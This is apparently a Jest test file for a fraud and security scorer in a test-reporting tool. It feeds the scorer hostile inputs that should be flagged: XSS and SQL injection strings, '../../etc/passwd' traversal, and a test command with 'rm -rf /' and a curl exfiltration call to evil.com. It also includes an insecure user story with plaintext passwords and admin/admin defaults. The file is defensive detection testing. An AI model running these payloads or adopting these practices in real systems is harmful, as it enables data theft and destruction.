/**
 * Fraud Detection Tests for Story Reporter Theme
 */

import { MockDetector } from '../../../../shared/fraud-detection/detectors/mock-detector';
import { SecurityDetector } from '../../../../shared/fraud-detection/detectors/security-detector';
import { AnomalyDetector } from '../../../../shared/fraud-detection/detectors/anomaly-detector';
import { InputValidator } from '../../../../shared/fraud-detection/detectors/input-validator';
import { FraudScorer } from '../../../../shared/fraud-detection/scoring/fraud-scorer';
import { FraudReporter } from '../../../../shared/fraud-detection/reporting/fraud-reporter';
import { FraudCheckType, FraudSeverity, ExportFormat } from '../../../../shared/fraud-detection/types';
import { StoryReporter } from '../../src/story-reporter';
import { ReportGenerator } from '../../src/report-generator';
import * as fs from 'fs/promises';
import { path } from '../../../../../infra_external-log-lib/src';

describe('Story Reporter Fraud Detection', () => {
  let fraudScorer: FraudScorer;
  let fraudReporter: FraudReporter;
  let storyReporter: StoryReporter;
  let reportGenerator: ReportGenerator;
  let testOutputDir: string;

  beforeEach(async () => {
    // Setup fraud detection
    fraudScorer = new FraudScorer({
      enabledDetectors: [
        FraudCheckType.MOCK_DETECTION,
        FraudCheckType.SECURITY_VALIDATION,
        FraudCheckType.ANOMALY_DETECTION,
        FraudCheckType.INPUT_VALIDATION
      ],
      scoreThreshold: 70,
      strictMode: false,
      logging: true
    });

    // Register detectors
    fraudScorer.registerDetector(new MockDetector());
    fraudScorer.registerDetector(new SecurityDetector());
    fraudScorer.registerDetector(new AnomalyDetector());
    fraudScorer.registerDetector(new InputValidator());

    fraudReporter = new FraudReporter();

    // Setup story reporter
    testOutputDir = `/tmp/story-reporter-fraud-${Date.now()}`;
    await fs.mkdir(testOutputDir, { recursive: true });
    
    storyReporter = new StoryReporter({ outputDir: testOutputDir });
    reportGenerator = new ReportGenerator();
  });

  afterEach(async () => {
    await fs.rm(testOutputDir, { recursive: true, force: true });
  });

  describe('Test Result Validation', () => {
    it('should detect mock usage in test results', async () => {
      const testResults = {
        testSuite: 'UserService',
        tests: [
          {
            name: 'should create user',
            code: `
              jest.mock('../database');
              const mockDb = { save: jest.fn() };
              
              test('should create user', () => {
                const user = createUser('John', mockDb);
                expect(mockDb.save).toHaveBeenCalled();
              });
            `,
            result: 'passed'
          }
        ]
      };

      const fraudResult = await fraudScorer.score(testResults);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.riskLevel).not.toBe('none');
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('mock'),
          severity: expect.any(String)
        })
      );
    });

    it('should validate test report inputs', async () => {
      const maliciousReport = {
        title: 'Test Report<script>alert("XSS")</script>',
        summary: "'; DROP TABLE test_results; --",
        results: [
          {
            test: 'test1',
            status: 'passed',
            duration: -100 // Invalid duration
          }
        ]
      };

      const fraudResult = await fraudScorer.score(maliciousReport);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('xss'),
          severity: FraudSeverity.HIGH
        })
      );
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('sql_injection'),
          severity: FraudSeverity.CRITICAL
        })
      );
    });
  });

  describe('Report Generation Security', () => {
    it('should sanitize report content before generation', async () => {
      const unsafeContent = {
        projectName: 'Test Project',
        testResults: [
          {
            suite: 'SecurityTest',
            test: 'XSS Prevention',
            description: '<img src=x onerror=alert(1)>',
            result: 'passed'
          }
        ]
      };

      // Check for fraud before generating report
      const fraudResult = await fraudScorer.score(unsafeContent);
      
      if (!fraudResult.passed) {
        // Sanitize content
        unsafeContent.testResults[0].description = 'XSS Prevention Test';
      }

      const report = await reportGenerator.generate(unsafeContent);
      
      expect(report.html).not.toContain('onerror');
      expect(report.html).not.toContain('<img src=x');
    });

    it('should detect path traversal in file operations', async () => {
      const maliciousConfig = {
        outputPath: '../../etc/passwd',
        templatePath: '../../../sensitive/data.html'
      };

      const fraudResult = await fraudScorer.score(maliciousConfig);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('path_traversal'),
          severity: FraudSeverity.HIGH
        })
      );
    });
  });

  describe('Anomaly Detection in Test Metrics', () => {
    it('should detect anomalous test execution patterns', async () => {
      // Normal test results
      const normalResults = Array(10).fill(0).map((_, i) => ({
        test: `test${i}`,
        duration: 100 + Math.random() * 50,
        memory: 50 + Math.random() * 20
      }));

      // Add anomalous result
      normalResults.push({
        test: 'anomalous_test',
        duration: 10000, // Extremely long duration
        memory: 5000     // Extremely high memory usage
      });

      const testReport = {
        results: normalResults,
        totalDuration: normalResults.reduce((sum, r) => sum + r.duration, 0)
      };

      const fraudResult = await fraudScorer.score(testReport);

      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('statistical_anomaly'),
          message: expect.stringContaining('outlier')
        })
      );
    });

    it('should detect suspicious patterns in test names', async () => {
      const suspiciousTests = {
        testSuite: 'Suspicious Suite',
        tests: [
          { name: 'test'.repeat(50), result: 'passed' }, // Repeated pattern
          { name: '0xDEADBEEF'.repeat(10), result: 'passed' }, // Hex pattern
          { name: btoa('malicious payload'), result: 'passed' } // Base64
        ]
      };

      const fraudResult = await fraudScorer.score(suspiciousTests);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations.length).toBeGreaterThan(0);
    });
  });

  describe('Story Content Validation', () => {
    it('should validate user story content for security threats', async () => {
      const userStory = {
        id: 'US-001',
        title: 'Implement User Authentication',
        description: `As a user, I want to login with my credentials.
        
        Implementation notes:
        - Store passwords as plaintext for easy debugging
        - Use admin/admin as default credentials
        - Disable SSL for local testing`,
        acceptanceCriteria: [
          'User can login with username/password',
          'System stores password in database',
          'Admin has access to all user passwords'
        ]
      };

      const fraudResult = await fraudScorer.score(userStory);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          message: expect.stringContaining('plaintext')
        })
      );
    });

    it('should detect command injection in story descriptions', async () => {
      const maliciousStory = {
        id: 'US-002',
        title: 'File Upload Feature',
        description: 'Allow users to upload files; rm -rf /',
        testCommand: 'npm test && curl http://evil.com/steal-data'
      };

      const fraudResult = await fraudScorer.score(maliciousStory);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('command_injection'),
          severity: FraudSeverity.CRITICAL
        })
      );
    });
  });

  describe('Comprehensive Fraud Reporting', () => {
    it('should generate comprehensive fraud report for story reporter', async () => {
      const storyReportData = {
        project: 'E-Commerce Platform',
        stories: [
          {
            id: 'US-100',
            title: 'Shopping Cart',
            tests: [
              {
                name: 'Add to cart',
                code: 'jest.mock("./api"); // Mock API calls',
                result: 'passed'
              }
            ]
          }
        ],
        metrics: {
          totalTests: 150,
          passedTests: 145,
          coverage: 85,
          duration: 12000
        },
        config: {
          outputPath: './reports/test-report.html',
          includeScreenshots: true
        }
      };

      const fraudResult = await fraudScorer.score(storyReportData);
      const report = fraudReporter.generateReport(fraudResult);

      expect(report.summary.totalViolations).toBeGreaterThan(0);
      expect(report.details.violationsByType.size).toBeGreaterThan(0);

      // Export fraud report
      const markdownReport = fraudReporter.exportReport(report, ExportFormat.MARKDOWN);
      
      expect(markdownReport).toContain('# Fraud Detection Report');
      expect(markdownReport).toContain('Mock usage detected');
      expect(markdownReport).toContain('## Recommendations');
      
      // Save fraud report
      await fs.writeFile(
        path.join(testOutputDir, 'fraud-report.md'),
        markdownReport
      );
    });
  });

  describe('Real-time Fraud Monitoring', () => {
    it('should monitor test execution for fraud patterns', async () => {
      const fraudEvents: any[] = [];
      
      // Setup fraud monitoring
      const monitor = storyReporter.enableFraudMonitoring({
        detectors: [new MockDetector(), new SecurityDetector()],
        onViolation: (violation) => {
          fraudEvents.push(violation);
        }
      });

      // Execute tests with various patterns
      await storyReporter.runTests({
        suite: 'MonitoredSuite',
        tests: [
          {
            name: 'Normal test',
            code: 'expect(1 + 1).toBe(2);'
          },
          {
            name: 'Test with mock',
            code: 'const mockFn = jest.fn(); mockFn();'
          },
          {
            name: 'Test with SQL',
            code: `const query = "SELECT * FROM users WHERE id = '1' OR '1'='1'";`
          }
        ]
      });

      expect(fraudEvents.length).toBeGreaterThan(0);
      expect(fraudEvents).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('mock')
        })
      );
      expect(fraudEvents).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('sql_injection')
        })
      );

      monitor.stop();
    });
  });

  describe('Integration with CI/CD Pipeline', () => {
    it('should fail build on critical fraud detection', async () => {
      const buildConfig = {
        testResults: {
          suite: 'Production Tests',
          tests: [
            {
              name: 'Database test',
              code: `
                // This test contains security vulnerabilities
                const password = 'admin123';
                const privateKey = '-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA...';
                const sqlQuery = "DELETE FROM users WHERE 1=1";
              `
            }
          ]
        },
        fraudThreshold: 50
      };

      const fraudResult = await fraudScorer.score(buildConfig.testResults);
      
      expect(fraudResult.overallScore).toBeGreaterThan(buildConfig.fraudThreshold);
      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.riskLevel).not.toBe('none');
      expect(fraudResult.riskLevel).not.toBe('low');

      // Simulate CI/CD decision
      const shouldFailBuild = fraudResult.overallScore > buildConfig.fraudThreshold;
      expect(shouldFailBuild).toBe(true);
    });
  });
});